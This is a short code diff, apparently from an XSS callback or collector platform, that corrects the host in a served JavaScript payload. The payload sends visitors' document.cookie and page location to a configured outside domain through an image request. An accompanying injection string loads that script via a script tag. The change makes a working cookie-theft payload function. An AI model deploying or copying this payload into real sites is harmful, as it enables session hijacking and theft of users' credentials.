@@ -64,7 +64,7 @@ def init_response_setting():
     response_setting_list = [
         {"name": 'global_xss', "path": "", "response_reason": "OK",
          "response_status_code": 200, "response_headers": json.dumps({"ETag": 'W/"7-ZRvuH4DW9Kitwsjlj5Mh0bAOkR0"',"Server": "XXX"}),
-         "response_content_type": "text/javascript;charset=UTF-8", "response_content": b"(new Image()).src = 'http://web," + bytes(BaseConfig.DNS_DOMAIN, 'utf-8') + b"/x?data='+document.cookie+'&location='+document.location;", "mark": f"<sCRiPt/SrC=//web.{BaseConfig.DNS_DOMAIN}/>"},
+         "response_content_type": "text/javascript;charset=UTF-8", "response_content": b"(new Image()).src = 'http://web." + bytes(BaseConfig.DNS_DOMAIN, 'utf-8') + b"/x?data='+document.cookie+'&location='+document.location;", "mark": f"<sCRiPt/SrC=//web.{BaseConfig.DNS_DOMAIN}/>"},
         {"name": 'xss_response', "path": "/x", "response_reason": "OK",
          "response_status_code": 200, "response_headers": json.dumps({"ETag": 'W/"7-ZRvuH4DW9Kitwsjlj5Mh0bAOkR0"', "Server": "XXX"}),
          "response_content_type": None, "response_content": b"You are a good boy!", "mark": u""},
